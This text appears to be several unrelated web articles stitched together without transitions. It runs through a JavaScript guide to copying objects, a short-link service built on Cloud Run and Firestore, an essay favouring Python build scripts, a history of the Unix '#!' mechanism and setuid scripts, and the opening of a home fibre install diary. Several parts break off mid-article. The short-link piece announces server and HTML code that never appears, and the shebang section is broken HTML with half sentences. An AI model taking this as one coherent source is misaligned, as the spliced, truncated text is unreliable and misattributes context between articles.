<p>Let us consider, for example, a canonical “full stack” web developer, with some knowledge of cloud native apps; quite a common resumé these days. The person will surely use a rather high-level programming language, most probably JavaScript, Java, PHP, or C#. They will create a Docker container out of that code, and this container would run inside some Kubernetes cluster, itself running inside a virtual machine running in some cloud provider. In the middle, maybe, a CI/CD pipeline running in yet another virtual machine; most probably <a href="https://docs.gitlab.com/ee/ci/docker/using_docker_build.html" target="_blank" rel="noopener noreferrer">GitLab running the “Docker-in-Docker” image</a>, building other images.</p>
<p>The actual hardware is, of course, nowhere to be seen. It is virtual machines all over, and legend has it that at some point there is an actual CPU executing those instructions. A CPU, you know, labeled with the 64 bits moniker, built with silicon, plugged to a socket, and hopelessly capped at 3 GHz.</p>

<![CDATA[Copying Objects in JavaScript]]>

November 1, 2020 | https://smalldata.tech/blog/2018/11/01/copying-objects-in-javascript | <a href="https://web.archive.org/web/*/https://smalldata.tech/blog/2018/11/01/copying-objects-in-javascript">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>
  In this article we will look at the various ways an object can be copied in Javascript. We will take a look at both
  shallow and deep copying.
</p>

<p>
  Before we begin, it is worth mentioning a few basics: objects in Javascript are simply references to a location in
  memory. These references are mutable, i.e. they can be reassigned. Thus, simply making a copy of a reference only
  results in 2 references pointing to the same location in memory:
</p>

<pre>var foo = {
    a : "abc"
}
console.log(foo.a); // abc

var bar = foo;
console.log(bar.a); // abc

foo.a = "yo foo";
console.log(foo.a); // yo foo
console.log(bar.a); // yo foo

bar.a = "whatup bar?";
console.log(foo.a); // whatup bar?
console.log(bar.a); // whatup bar?    
</pre>

<p>
  As you see in the above example, both foo and bar are reflecting the change done in either object. Thus, making a copy
  of an object in Javascript requires some care depending upon your use case.
</p>

<h5>Shallow copy</h5>

<p>
  If your object only has properties which are value types, you can use the spread syntax or
  <code>Object.assign(...)</code>
</p>

<pre>var obj = { foo: "foo", bar: "bar" };

var copy = { ...obj }; // Object { foo: "foo", bar: "bar" }
</pre>

<pre>var obj = { foo: "foo", bar: "bar" };

var copy = Object.assign({}, obj); // Object { foo: "foo", bar: "bar" }
</pre>

<p>
  Note that both of the above methods can be used to copy property values from <i>multiple source objects</i> to a
  target object:
</p>

<pre>var obj1 = { foo: "foo" };
var obj2 = { bar: "bar" };

var copySpread = { ...obj1, ...obj2 }; // Object { foo: "foo", bar: "bar" }
var copyAssign = Object.assign({}, obj1, obj2); // Object { foo: "foo", bar: "bar" }
</pre>

<p>
  The problem with the above methods lies in the fact that for objects with properties which are themselves objects,
  only the references are copied over, i.e. it is the equivalent of doing <code>var bar = foo;</code> as in the first
  code example:
</p>

<pre>var foo = { a: 0 , b: { c: 0 } };
var copy = { ...foo };

copy.a = 1;
copy.b.c = 2;

console.dir(foo); // { a: 0, b: { c: 2 } }
console.dir(copy); // { a: 1, b: { c: 2 } }
</pre>

<h5>Deep copy (with caveats)</h5>

<p>
  In order to deep copy objects, a potential solution can be to serialize the object to a string and then deserialize it
  back:
</p>

<pre>var obj = { a: 0, b: { c: 0 } };
var copy = JSON.parse(JSON.stringify(obj));
</pre>

<p>
  Unfortunately, this method only works when the source object contains serializable value types and does not have any
  circular references. An example of a non-serializable value type is the <code>Date</code> object - even though it is
  printed in ISO format on stringification, <code>JSON.parse</code> only interprets it as a string and not as a
  <code>Date</code> object.
</p>

<h5>Deep copy (with fewer caveats)</h5>

<p>
  For more complex cases, one could make use of a newer HTML5 cloning algorithm called
  <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm">"structured clone"</a>. Unfortunately, at the time of writing it is still limited to certain built-in types but it supports many more types
  than what <code>JSON.parse</code> does: Date, RegExp, Map, Set, Blob, FileList, ImageData, sparse and typed Array. It
  also preserves references within the cloned data, allowing it to support cyclical and recursive structures that don't
  work with the above mentioned serialization method.
</p>

<p>
  Currently, there is no direct way of calling the structured clone algorithm but there are some newer browser features
  that use this algorithm under the hood. Thus, there are a couple of workarounds that could potentially be used to deep
  copy objects.
</p>

<p>
  <u>Via MessageChannels</u>: the idea behind this is to leverage the serialization algorithm used by a communication
  feature. Since this feature is event based, the resultant clone is also an asynchronous operation.
</p>

<pre>class StructuredCloner {
  constructor() {
    this.pendingClones_ = new Map();
    this.nextKey_ = 0;

    const channel = new MessageChannel();
    this.inPort_ = channel.port1;
    this.outPort_ = channel.port2;

    this.outPort_.onmessage = ({data: {key, value}}) =&gt; {
      const resolve = this.pendingClones_.get(key);
      resolve(value);
      this.pendingClones_.delete(key);
    };
    this.outPort_.start();
  }

  cloneAsync(value) {
    return new Promise(resolve =&gt; {
      const key = this.nextKey_++;
      this.pendingClones_.set(key, resolve);
      this.inPort_.postMessage({key, value});
    });
  }
}

const structuredCloneAsync = window.structuredCloneAsync =
    StructuredCloner.prototype.cloneAsync.bind(new StructuredCloner);


const main = async () =&gt; {
  const original = { date: new Date(), number: Math.random() };
  original.self = original;

  const clone = await structuredCloneAsync(original);

  // different objects:
  console.assert(original !== clone);
  console.assert(original.date !== clone.date);

  // cyclical:
  console.assert(original.self === original);
  console.assert(clone.self === clone);

  // equivalent values:
  console.assert(original.number === clone.number);
  console.assert(Number(original.date) === Number(clone.date));

  console.log("Assertions complete.");
};

main();
</pre>

<p>
  <u>Via the history API</u>: both <code>history.pushState()</code> and <code>history.replaceState()</code> create a
  structured clone of their first argument! Note that while this method is synchronous, manipulating browser history is
  not a fast operation and calling this method repeatedly can lead to browser unresponsiveness.
</p>

<pre>const structuredClone = obj =&gt; {
  const oldState = history.state;
  history.replaceState(obj, null);
  const clonedObj = history.state;
  history.replaceState(oldState, null);
  return clonedObj;
};
</pre>

<p>
  <u>Via the
    <a href="https://developer.mozilla.org/en-US/docs/Web/API/Notification/Notification">notification API</a></u>: when creating a new notification, the constructor creates a structured clone of its associated data. Note that it
  also attempts to display a browser notification to the user, but this will silently fail unless the application has
  requested permissions to display notifications. In the case that permission was granted, the notification is
  immediately closed.
</p>

<pre>const structuredClone = obj =&gt; {
  const n = new Notification("", {data: obj, silent: true});
  n.onshow = n.close.bind(n);
  return n.data;
};
</pre>

<h5>Deep copy in Node.js</h5>

<p>
  As of version 8.0.0, Node.js provides a
  <a href="https://nodejs.org/api/v8.html#v8_serialization_api">serialization api</a> which is compatible with
  structured clone. Note that this API is marked as experimental at the time of writing:
</p>

<pre>const v8 = require('v8');
const buf = v8.serialize({a: 'foo', b: new Date()});
const cloned = v8.deserialize(buf);
cloned.b.getMonth();
</pre>

<p>
  For versions below 8.0.0 or for a more stable implementation, one can use lodash's
  <code><a href="https://lodash.com/docs#cloneDeep">cloneDeep</a></code> method, which is also loosely based on the
  structured clone algorithm.
</p>

<h5>Conclusion</h5>

<p>
  To sum up, the best algorithm for copying objects in Javascript is heavily dependent on the context and type of
  objects that you are looking to copy. While lodash is the safest bet for a generic deep copy function, you might get a
  more efficient implementation if you roll your own, the following is an example of a simple deep clone that works for
  dates as well:
</p>

<pre>function deepClone(obj) {
  var copy;

  // Handle the 3 simple types, and null or undefined
  if (null == obj || "object" != typeof obj) return obj;

  // Handle Date
  if (obj instanceof Date) {
    copy = new Date();
    copy.setTime(obj.getTime());
    return copy;
  }

  // Handle Array
  if (obj instanceof Array) {
    copy = [];
    for (var i = 0, len = obj.length; i &lt; len; i++) {
        copy[i] = deepClone(obj[i]);
    }
    return copy;
  }

  // Handle Function
  if (obj instanceof Function) {
    copy = function() {
      return obj.apply(this, arguments);
    }
    return copy;
  }

  // Handle Object
  if (obj instanceof Object) {
      copy = {};
      for (var attr in obj) {
          if (obj.hasOwnProperty(attr)) copy[attr] = deepClone(obj[attr]);
      }
      return copy;
  }

  throw new Error("Unable to copy obj as type isn't supported " + obj.constructor.name);
}
</pre>

<p>
  Personally, I'm looking forward to be able to use structured clone everywhere and finally put this issue to rest,
  happy cloning :)

            <div>
              <p>In this article we’ll build a simple yet powerful short link service using two of my favorite Google Cloud technologies: Cloud Run and Firestore. The code can be found on <a href="https://github.com/marcacohen/mco.fyi">Github</a> and here’s a <a href="https://mco.fyi/links">slide version</a> of this story.</p>
<h2 id="introduction">Introduction</h2>
<p>I love building demos but sometimes they can feel a bit artificial, like you’re building a program that no one would actually want to use, just to illustrate some capability or technique. But if you choose carefully, you can find demos that are both simple and useful, which for me is the best possible vehicle for learning.</p>
<p><img src="https://mco.dev/img/SweetSpot.png" width="400" height="400"></p><h2 id="what-problem-are-we-trying-to-solve">What problem are we trying to solve?</h2>
<p>I always like to start any work with a problem statement because, as Lewis Carroll said, “if you don’t know where you’re going, any road will get you there”. Here’s my problem statement:</p>
<p>I want to share my teaching artifacts but I hate long, hard to remember URLs. In the past I’ve used a short link service, like <code>bit.ly</code>, but there are some problems with that approach:</p>

<p><img src="https://mco.dev/img/namespace.png" width="400" height="400"></p><ul>
<li><strong>globally shared namespace</strong> - Good luck getting your hands on <code>bit.ly/cloud</code>. Like the Internet Domain Name System, the gold rush is over and all the nice short names are gone.</li>
<li><strong>trust</strong> - Links you publicize can have a life of their own so you’re trusting this service to be a responsible, reliable, and secure custodian of your data.</li>
<li><strong>privacy</strong> - Allowing another party to manage your links means they have complete visibility over all of your traffic.</li>
<li><strong>branding</strong> - You turn over your branding to the company serving your links. Wouldn’t it be nice to have your own identity embedded in your short links?</li>
</ul>
<h2 id="requirements">Requirements</h2>
<p>What does it mean, to me, to solve this problem?</p>
<br>
<ul>
<li>I own the whole namespace so I get first crack at the shortest short links possible.</li>
<li>The service should use my domain name and branding.</li>
<li>I don’t want to spend much time maintaining this app so I’d like it to be simple and small (&lt;500 lines of code, please).</li>
<li>It must be scalable, so that it doesn’t crash under the intense weight of my wildly popular articles (ok, that’s never happened but I can dream, can’t I?).</li>
<li>I’d like a clean landing page providing a directory of all available short links.</li>
<li>I want some basic analytics so that I can see the relative popularity of each link.</li>
<li>I want to use 100% managed services. I don’t want to directly think about, or even be aware of, any servers.</li>
</ul>
<h2 id="design">Design</h2>
<p>Thanks to my last requirement, this program is so simple it hardly warrants a design diagram but old habits die hard, so here’s mine:</p>

<p><img src="https://mco.dev/img/sldesign.png" width="400" height="400"></p><h2 id="database---cloud-firestore">Database - Cloud Firestore</h2>
<p>I chose <a href="https://cloud.google.com/firestore">Cloud Firestore</a> for my database because it’s SIMPLE (Scalable, Intuitive, Managed, Pay-as-you-go, Language-agnostic, and Economical).</p>
<p>My data model is also quite simple: one document field per short link, each containing a map of these values:</p>
<ul>
<li><strong>key</strong> - a short link part of the URL (e.g. “foo” for <code>mco.fyi/foo</code>), naming the map</li>
<li><strong>url</strong> - the long link, i.e. where to redirect requests for a given short link</li>
<li><strong>count</strong> - keeps track of how many times a given short link was accessed</li>
<li><strong>desc</strong> - a human friendly description of where a given short link takes you</li>
<li><strong>private</strong> - a boolean value which hides the short link from the public list</li>
</ul>
<p>Here’s the data model in action as seen in the Google Cloud Console:</p>

<p><img src="https://mco.dev/img/firestore-console.png" width="400" height="400"></p><p>One thing I really like about Firestore is you can use the console to update your data as well as view it. It essentially gives me a database administration user interface for free. Less work for me!</p>
<h2 id="web-front-end---skeleton">Web Front End - Skeleton</h2>
<p>I’m using a styling package called <a href="http://getskeleton.com/">skeleton</a>, which I quite like because it’s simple, small, and responsive. Here’s an abbreviated copy of the HTML for my home page:</p>

<p>I wanted my home page to simply list all the available short links, dynamically, and that’s exactly what the <code>div</code> element starting at line 42 does. A bit later, we’ll visit my server code, which populates the data incorporated into this template.</p>
<p>Here’s an abbreviated copy of the HTML for my 404 page, which is needed for the case when a non-existent short link is requested. You can experience this page yourself by visiting <a target="_blank" href="https://mco.fyi/foo">mco.fyi/foo</a> (you may need to have seen a certain film in order to appreciate the joke):</p>

<h2 id="server---cloud-run">Server - Cloud Run</h2>
<p>For my web server, I chose <a href="https://cloud.google.com/run">Cloud Run</a> because, like Firestore, it’s SIMPLE (Scalable, Intuitive, Managed, Pay-as-you-go, Language-agnostic, and Economical). It doesn’t make me think about servers, or scaling, or any of the annoying system administration details I don’t want to deal with.</p>
<p>Of course, I want this service to live behind a nice short domain name so I snarfed up <code>mco.fyi</code> (the “fyi” top level domain feels just right for this kind of service). Cloud Run makes it super easy to assign your own domain name to a service and you get secure serving via SSL/TLS/https automatically and painlessly.</p>
<p>I chose to write my server in Go, because it’s my favorite system programming language. Because Cloud Run is language and environment agnostic, I could have just as easily used Python, Java, Ruby, or FORTRAN for that matter (ok, FORTRAN might be a challenge but wouldn’t that be fun?).</p>
<p>Here’s my server code, which is small enough to fit into one main.go source file:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>For quite some time now, given the choice, I’ve opted to write my build scripts in plain Python using nothing but the standard libraries. I personally believe (with good reason) that build scripts are best served by a general purpose scripting language such as this, and that domain-specific languages or frameworks for build scripting have little if anything to offer. Most people use DSLs such as NAnt, MSBuild, Rake, Grunt or Gradle for their build scripts simply because they believe That Is How You Are Supposed To Do It, but in most cases it isn’t necessary, and in many cases it is even counterproductive.</p>



<p>In this post, I’d like to explain the reasons why I recommend using general purpose scripting languages and avoiding specialised build frameworks, and to address some commonly held misconceptions about build scripts in general. If I’m saying a lot about MSBuild, that’s because it’s the tool that I have the most experience with; however, many of my points apply to other tools as well, including those that aren’t XML-based.</p>



<h2>1. Build scripts are code, not configuration.</h2>



<p>Most build frameworks view build scripts as configuration first and code second. This is wrong. Badly wrong.</p>



<p>You see this in the way they adopt a declarative, rather than an imperative, approach, defining your script in terms of “targets” or “tasks” with dependencies between them. This approach can make sense in some situations — in particular, where you have a large number of similar tasks in a complex dependency graph, and you need to allow the build engine to determine the order in which they are run. This is the case, for example, with Visual Studio solutions that consist of a large number of projects.</p>



<p>But top level build scripts don’t work that way. At the topmost level, build scripts are inherently imperative in nature, so a declarative approach doesn’t make a whole lot of sense. Your typical build script consists of a sequence of diverse tasks which are run in an order that you define, or sometimes in a loop based on values in a collection. For example, it may look something like this:</p>



<ul><li>Fetch the latest version of your code from source control</li><li>Delete any leftover files from the previous build</li><li>Write a file to disk containing version information</li><li>Fetch your project’s dependencies (NuGet packages, for example)</li><li>Compile your project</li><li>Bundle and minify your assets</li><li>Run your unit tests</li><li>Run your integration tests</li><li>Prepare installation packages</li><li>Deploy your build to the appropriate servers</li><li>Prepare reports (e.g. code coverage)</li></ul>



<p>Writing your build script imperatively, with each of these steps as a function call in the top level of your code, allows you to see, at a glance, what your script is doing. On the other hand, writing them declaratively, with each task specifying its own dependencies, often requires you to jump around all over your build script just to get a handle on things.</p>



<p>One important thing that build scripts need is control flow structures — conditions, loops, iteration over arrays, parametrised subroutines, variables, and so on. You simply can’t represent these properly with a declarative language. Sure, you can define tasks to handle some of these requirements, such as regex-based find and replace, but that will never be as clear as a purely imperative approach.</p>



<p>I’ve never come across a definitive explanation why build frameworks should all be based around the declarative, configuration-like approach of tasks with dependencies, other than a vague, hand-waving and unsubstantiated claim that “people prefer it that way.” Personally I think it’s more likely that people just saw that this was how <a href="http://www.gnu.org/software/make/">make</a>, the granddaddy of build tools, was designed, assumed that it was a Best Practice, and blindly copied it without thinking.</p>



<h2>2. Build scripts need to be maintained.</h2>



<p>Build scripts don’t tend to change very often — perhaps once every three to six months or so. Consequently it’s tempting to view them as something that you write once and can forget about completely. However, they do change, so readability and maintainability are critical. A well written build script can make all the difference between a change taking half an hour and it taking half a sprint; between it working as intended and being riddled with bugs.</p>



<p>This means, of course, that XML-based build languages, such as MSBuild or NAnt, are a very bad idea. This is nothing to do with a lack of “cool” — it’s a lack of readability and maintainability, pure and simple. XML simply isn’t capable of expressing the kind of control flow structures that you need in a succinct, readable manner. MSBuild is particularly bad here. Its lack of support for looping, iteration or parametrised subroutines makes it difficult if not impossible to write anything more complex than the simplest of build scripts without resorting to painful amounts of copy and paste code. Since DRY is a vital discipline in keeping your code maintainable, anything that forces you to violate it as much as MSBuild does should be avoided with extreme prejudice.</p>



<p>To mitigate the problem, Ant, NAnt and MSBuild allow you to embed snippets of code in other languages, <a href="http://blogs.msdn.com/b/visualstudio/archive/2010/02/20/msbuild-task-factories-guest-starring-windows-powershell.aspx">such as PowerShell</a>. Besides the fact that the syntax to do so is so verbose and cumbersome that it’s scarcely worth it, this just raises the question: why not just use PowerShell end to end instead?</p>



<h2>3. Build scripts need to be run from the command line.</h2>



<p>It’s all too common to find build scripts that are very tightly integrated with the Continuous Integration server. This usually happens when you have vast swathes of configuration settings in TeamCity, TFS, Jenkins or what have you. This causes two problems: first, you have a lot of important and potentially breaking detail that isn’t checked into source control; second, it becomes very difficult if not impossible to run your build on your local machine, end to end, from the command line.</p>



<p>If you can’t run your build from the command line, debugging it will be painful. Every iteration of your edit-compile-test loop will require a separate check-in and a sit-on-your-hands wait for several minutes until it either completes or breaks. This is a very inefficient and wasteful way of doing things. It can also cause problems when you have to track down a regression with git bisect, because you’ll have a whole string of broken revisions to contend with.</p>



<h2>4. Build scripts have few other domain specific requirements, if any.</h2>



<p>Apart from this, there are only two other requirements that your build scripts have. Your build language needs to be interpreted rather than compiled (otherwise you’ll have a chicken-and-egg problem), and it needs to be able to run other programs: your compiler; NuGet to fetch your dependencies; your test runner; and so on. But that’s pretty much it. Just about any general purpose scripting language — Python, Ruby, PowerShell, bash, DOS batch files, heck even PHP if you’re that way inclined — will fit the bill.</p>



<p>What about the specific (N)Ant/MSBuild tasks that you need to call? Most of these can be implemented quite simply as calls to either the language’s standard library or a command line interface.</p>



<p>Some .NET developers don’t like this approach because they say that using, say, Python or PowerShell would mean having to learn a new language. Personally I find this a very strange argument, because if you’re using MSBuild, you’re doing that already anyway. Not only that, but the learning curve that you’re taking is actually steeper: the conceptual differences between, say, C# and Python are very superficial when compared to the conceptual differences between C# and MSBuild. Besides, learning a scripting language is a skill that can be transferred to other problem domains if necessary, whereas MSBuild is a very specialised and niche language that only ever gets used for build scripts for .NET projects.</p>



<p>Just because you are presented with something that describes itself as a build tool doesn’t mean to say you have to use it. Aim to choose tools and languages that allow you to write code that is easy to read, understand and maintain. You’ll be much more productive and much less stressed — and the people who have to maintain your code after you will thank you for it.</p>

        quoted in 4.0 BSD <a href="https://www.in-ulm.de/~mascheck/various/shebang/4.0BSD_newsys_sys1.c.html">/usr/src/sys/<b>newsys</b>/sys1.c</a>.
	<br> The path component <code>newsys</code> was an option.
	<br>It is also mentioned as in 
        <a href="http://www.tuhs.org/cgi-bin/utree.pl?file=4BSD/usr/src/sys/sys/TODO">/usr/src/sys/<b>sys</b>/TODO</a> (that is, in the regular path),
	</p><pre>6. Exec fixes
	Implement dmr's #! feature; pass string arguments through faster.</pre>
        <p>So this <code>#!</code> mechanism origins from Bell Labs, between Version 7 and Version 8,
	<br> and was then available on 4.0BSD (~10/'80), although not activated per default.

	<br> Two important differences to current implementations are:
	<br>The length of the line was limited to 16 (Research Unix) or 32 (BSD) bytes.
	<br>"Arguments" were not delivered.

	</p><p> It was then implemented by default on 4.2BSD (~09/'83),
        <a href="https://www.in-ulm.de/~mascheck/various/shebang/42bsd_kern_exec.c.html">/usr/src/sys/sys/kern_exec.c</a>
	by <a href="http://mail-index.netbsd.org/netbsd-users/2008/11/10/msg002390.html">Robert Elz</a>.
	<br> This implementation delivered all #! arguments as a single one.

	</p><p> Less than a year after 4.0BSD, but more than two years before 4.2 BSD, <code>#!</code> was also added to
	<a href="https://www.in-ulm.de/~mascheck/various/shebang/2.8BSD_sys1.c.html">2.8BSD</a> (~07/'81), but not active by default.
	<br> 2.x BSD is a different development line, independent from 4 BSD.
	It's a 7th edition (V7) kernel with fixes activated by macros.
	<br> The macro for the <code>#!</code> code is not present in a makefile, so you had to activate it yourself.
	The code wording is slightly different from 4 BSD.
	<br> On 2.8 BSD, <code>#!</code> seems to come from the U.S. Geological Survey in Menlo Park, not from Berkeley.

       </p><p> <span size="1">(Thanks to Gunnar Ritter for pointing out the origins in 4.0 and 4.2BSD

	to Jeremy C. Reed for mentioning Robert Elz,
	and to Richard Kettlewell for spotting 2.8BSD on TUHS mailing list.)</span>

	</p><p> In 4.3BSD Net/2 the code was removed due to the license war and had to be reimplemented for
	the descendants (e.g., NetBSD, 386BSD, BSDI).

	</p><p> In Version 8 (aka 8th edition), <code>#!</code> is implemented in
	<code>/usr/sys/sys/<a href="https://www.in-ulm.de/~mascheck/various/shebang/8thedition_sys1.c.html">sys1.c</a></code>
	and documented in <code><a href="https://www.in-ulm.de/~mascheck/various/shebang/8thedition_exec.2.html">exec(2)</a></code>.

	</p><p> Among the public releases from Bell Labs, <code>#!</code> was not added until SVR4 ('88) according to a 
	TUHS list <a href="http://minnie.tuhs.org/pipermail/tuhs/2011-January/003880.html">discussion</a>.
	System III and SVR1 definitely had not implemented it, yet.

	</p><p>According to Dennis M. Ritchie (<a href="https://www.talisman.org/~erlkonig/documents/dennis-ritchie-and-hash-bang.shtml">email answer</a> to Alex North-Keys) 
he got the idea from elsewhere, perhaps from one of the UCB conferences on BSD. 
	And it seems <code>#!</code> had no name originally.

	<br>Doug McIllroy <a href="http://minnie.tuhs.org/pipermail/tuhs/2017-April/009712.html">mentions</a> (TUHS mailing list), that the slang for <code>#</code> was "sharp" at the time at Bell Labs.

	(<a href="https://www.in-ulm.de/~mascheck/various/shebang/unix-faq.txt">local copy</a>),
	<br>
        emphasizes the history concerning <i>shells</i>, not the kernel.

	</p><p> That document is incorrect about two details (and it seems not to be actively maintained at the moment):
	</p><ul>
	<li> <code>#!</code> was not invented at Berkeley (but they implemented
	it first in widely distributed releases), see above.
	</li><li> Concerning the <code>#</code> csh-hack: the document explicitly states that only csh was modified
	on the BSDs.<br>
	However, with 3BSD (03/'80) the Bourne shell was modified likewise on BSDs as well.
	<br> See the first occurence in <a href="https://www.in-ulm.de/~mascheck/various/shebang/csh-hack.html">3BSD usr/src/cmd/sh/service.c</a>
	(and the first appearance <a href="https://www.in-ulm.de/~mascheck/bourne/csh/">in csh</a> on 2BSD 05/'79).

</li><li> There is also an
	<a href="http://www.cwi.nl/~aeb/std/hashexclam.html">

	and follows a more generic approach (and it differs concerning
	a very few details).

<h4>Selected issues</h4>

<ul>
  <li> <a name="blankrequired"> <b>Blank after <code>#!</code> required?</b> </a>

	<p> There is a rumor, that a very few and very special, earlier
	Unix versions (particularly 4.2BSD derivatives) require you to
	separate the "<code>#!</code>" from the following path with a blank.
        <br>You may also read, that (allegedly) such a kernel parses
        "<code>#!&nbsp;/</code>" as a 32-bit (long) magic.

        But it turns out that it is virtually impossible to find
	a Unix which actually required this.

        </p><p> 4.2BSD in fact doesn't require it, although
	<a href="http://web.archive.org/web/20080118164924/http://www.gnu.org/software/autoconf/manual/autoconf-2.57/html_chapter/autoconf_10.html">previous versions</a>
	of the <i>GNU autoconf tutorial</i> wrongly claimed this
	("10. Portable Shell Programming", corrected with release 2.64, 2009-07-26).
<!-- http://www.gnu.org/manual/autoconf/html_chapter/autoconf_10.html -->
<!-- http://www.gnu.org/manual/autoconf/html_node/Portable-Shell.html -->

	<br> But instead, see 
        <a href="https://www.in-ulm.de/~mascheck/various/shebang/42bsd_kern_exec.c.html">4.2BSD,
        /usr/src/sys/sys/kern_exec.c</a> (the first regular occurence).
        A blank is accepted but not required.

        <br>All this pointed out by Gunnar Ritter in
	<a href="http://groups.google.com/groups?as_umsgid=3B5B0BA4.XY112IX2%40bigfoot.de">&lt;3B5B0BA4.XY112IX2@bigfoot.de&gt;</a>
        (and thanks to the new Caldera license, the code can be cited here now.)

        </p><p> Instead, the origin of this myth "of the required blank"
        <b>might</b> be a particular release of 4.1 BSD:
        There is a manpage in a "4.1.snap" snapshot of 4.1BSD
	<br>on the CSRG CDs, <a href="https://www.in-ulm.de/~mascheck/various/shebang/4.1BSD.snap.exec.2.html">/usr/man/man2/exec.2</a> (4/1/81),
        where a space/tab after the <code>#!</code> is mentioned as mandatory.
	However, this is not true: the source itself remained unchanged.
        <br>(Hint to the existence of such a manpage from Bruce Barnett in
        <a href="http://groups.google.com/groups?threadm=ae3m9l%24rti%240%40208.20.133.66&amp;prev=/groups%3Fas_umsgid%3Dae3m9l%2524rti%25240%2540208.20.133.66%26lr%3D%26hl%3Dde">&lt;ae3m9l$rti$0@208.20.133.66&gt;</a>).

	</p><p> It's not clear whether this is a bug or confusion in documentation
	or if Berkeley planned to modify the BSD source but eventually
	did not.

	</p><p>DYNIX is mentioned in the autoconf documentation, too.
	It's unclear if this variant might have implemented it in a few releases
	<br>(perhaps following the abovementioned manual page).

	At least <a href="https://www.in-ulm.de/~mascheck/various/shebang/Dynix-3.2.0-kern_exec.c.html">Dynix 3.2.0</a>
	or <a href="https://www.in-ulm.de/~mascheck/various/shebang/Dynix-PTX-1.2.0-kern_exec.c.html">Dynix PTS 1.2.0</a>
	were actually 4.2 BSD derived and did not require the blank.

	</p><p> I asked David MacKenzie, the author of the autoconf
	documentation, about the actual origin of the autoconf note.
	<br> But unfortunately neither the reporting author nor
	the very system are recorded anymore.

	</p><p> Even intensive search of usenet archives didn't reveal any
	further hints to me.

  </p></li><li> <a name="blankforbidden"> <b>Blank forbidden?</b> </a>

	<p>I found no evidence yet, that there's an implementation
	which <i>forbids</i> a blank after <code>#!</code>

   </p></li><li> <a name="setuid"><b>Setuid (set user id) support</b></a>

	<ul>
	<li> The setuid/gid-bit became ignored on many systems for security reasons.
	     This is mainly due to the race condition between the kernel starting
	     the interpreter and the interpreter starting the script.

	</li><li> SVR4 and 4.4BSD introduced a virtual filedescriptor filesystem which allows for avoiding this race:
	     Here the kernel can hand over an open filedescriptor (e.g. /dev/fd/n)
	     to the interpreter.
	     <p> 4.4BSD, however, didn't support setuid scripts, yet.
	     The <i>UNIX FAQ</i> claims this
	     (<i><a href="http://www.faqs.org/faqs/unix-faq/faq/part4/section-7.html">4.7. "How can I get setuid shell scripts to work?"</a></i>),
	     <br>but it's explicitly denied in <a href="https://www.in-ulm.de/~mascheck/various/shebang/44bsd_kern_exec.c.html">kern_exec.c</a>.
	     setuid for scripts had been disabled with 4.3BSD-Tahoe already.
	     <br>And the successor to 4.4BSD, 4.4BSD-Lite lost its <code>execve()</code>
	     implementation due to the license war.
	<br> Instead, a very early NetBSD release seems to be the origin concerning free BSDs
	<sup><span size="1">1</span></sup>.

	</span></p></td></tr></tbody></table>

	<p>Set user id support is implemented by means of the fd filesystem for instance on:
	</p><ul>
	<li> Solaris (since birth)
        </li><li> Irix (at least since release 5)
	</li><li> UnixWare (since birth) <!-- A HREF="http://docsrv.sco.com/cgi-bin/man/man?chmod+1" -->
	</li><li> NetBSD (almost since birth; but only with the kernel option <code>SETUIDSCRIPTS</code> activated)
	</li><li> OpenBSD (since birth; but only with the kernel option <code>SETUIDSCRIPTS</code> activated)
	</li><li> MacOS X since 10.5 / xnu-1228 / Leopard, earlier releases came without the fd filesystem.
		<br>See the sysctl kernel variable <code>kern.sugid_scripts</code>.
	</li></ul>

	<p>Set user id support is also implemented on:
	</p><ul>
	<li> SCO OpenServer 6.0. The documentation doesn't tell whether it's implemented with
	the fd filesystem.
	<br>Although <a href="http://osr600doc.sco.com/en/SEC_admin/ssC.bitclearing.html">
	this document</a> ("SUID, SGID, and sticky bit clearing on writes",
	via Security online docs/Maintainig System Security)
	<br> states, that suid/sgid bit don't work on shell scripts (not explicitly mentioning
	the <code>#!</code> mechanism),
	<br><a href="http://osr600doc.sco.com/man/html.1/chmod.1.html">chmod(1)</a> and
	<a href="http://osr600doc.sco.com/en/man/html.S/exec.S.html">exec(s)</a>
	explicitly state that the bit works, if an <code>#!</code> interpreter file is used.
	<br>As Bela Lubkin points out: very basically, OpenServer 6 is an OSR 507 userland with
	an underlying UnixWare 7.1.4 kernel.
	</li></ul>

	</li><li> A sidenote: the <a href="http://www.in-ulm.de/~mascheck/bourne/#svr4">SVR4 shell</a>
		introduced the related flag <code>-p</code>.  Without this flag, the EUID is set back
		to the UID if different.
		<br> ksh88 and ksh93 in contrast activate this flag automatically
		if the euid/egid is not equal to the uid/gid.
		<br> bash-1 didn't know this flag; bash-2 ff. implement it and require it to be set.

	</li><li> Nowadays many systems still ignore the setuid-bit with the <code>#!</code> mechanism,
	     because you have to be aware of numerous issues.
	    <br>See also the Unix FAQ entry mentioned above. A collection of keywords is:
	    <ul>
	    <li> the abovementioned race condition about the actual script being called
		(symlink attack)
	    </li><li> some ksh88 (relevant on systems which do not use the /dev/fd mechanism) …</li></ul></li></ul></li></ul></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  	
<p>As an excited prospective Gigabit Pro customer, my favorite reading to return to has been <a href="https://medium.com/@Gtwy/comcasts-2000mbit-fiber-to-the-home-f106d64d5f51">James Watt’s Medium.com</a> article about his install experience.  To that end, I wanted to create a similar post documenting my own install experiences so that you future Gigabit Pro users can learn from my experience and maybe get some of your questions answered.</p>



<p>The focus of this article is not a technical article about how I prepared my network for 10Gbps.  I may create another article soon detailing the setup of my network and how I am handling the bandwidth.  The purpose of this article is to document my installation experience.  So let’s dive in!</p>



<h2>Initial Inquiry</h2>



<p>My journey starts in mid-April of 2019.  I headed over to the <a href="https://www.reddit.com/r/Comcast_Xfinity">/r/Comcast_Xfinity</a> subreddit to inquire on how I could get an order going.  They were actually quite helpful over there, and shortly I was receiving a call from a representative from Comcast Sales Operations.</p>



<p>Talking with the sales representative, he was able to look at his network maps and determine that there was a fiber tap very close to my house, actually only about 5 houses down to the main street.  Based on this information, he thought I should be eligible for the service.</p>



<p>For those of you who are curious if you might be eligible, check utility poles near you for something that looks like this:</p>



